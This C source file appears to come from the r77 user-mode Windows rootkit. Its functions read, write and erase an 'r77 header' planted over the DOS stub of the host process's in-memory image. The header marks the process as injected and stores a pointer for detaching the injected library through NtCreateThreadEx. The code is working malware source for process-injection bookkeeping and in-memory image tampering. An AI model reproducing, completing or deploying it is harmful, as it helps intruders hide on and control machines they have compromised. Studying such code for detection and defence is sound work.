#include "r77process.h"
#include "r77def.h"
#include "r77win.h"

WORD GetR77Header(LPVOID *detachAddress)
{
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		WORD signature = *(LPWORD) & module[sizeof(IMAGE_DOS_HEADER)];
		if (signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE || signature == R77_HELPER_SIGNATURE)
		{
			if (detachAddress) *detachAddress = (LPVOID) * (PDWORD64) & module[sizeof(IMAGE_DOS_HEADER) + 2];
			return signature;
		}
	}

	return 0;
}
BOOL WriteR77Header(WORD signature, LPVOID detachAddress)
{
	BOOL result = FALSE;

	// Store the r77 header in the main module.
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		// The r77 header is written over the DOS stub.
		LPWORD signaturePtr = (LPWORD) & module[sizeof(IMAGE_DOS_HEADER)];

		// Do not write the signature, if this process already has an r77 signature.
		if (*signaturePtr != R77_SIGNATURE && *signaturePtr != R77_SERVICE_SIGNATURE && *signaturePtr != R77_HELPER_SIGNATURE)
		{
			DWORD oldProtect;
			if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
			{
				// The current process is now marked as injected and therefore, cannot be injected again.
				*signaturePtr = signature;

				// Write a function pointer that can be invoked using NtCreateThreadEx to detach the injected library gracefully.
				*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)detachAddress;

				VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
				result = TRUE;
			}
		}
	}

	return result;
}
VOID RemoveR77Header()
{
	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
	if (module)
	{
		DWORD oldProtect;
		if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
		{
			// Remove the r77 header by overwriting the DOS stub.
			// Even if this sequence of bytes doesn't match the original DOS stub, it does not affect the process.
			*(LPWORD)&module[sizeof(IMAGE_DOS_HEADER)] = 0x1f0e;
			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = 0xb821cd09b4000eba;

			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
		}
	}
}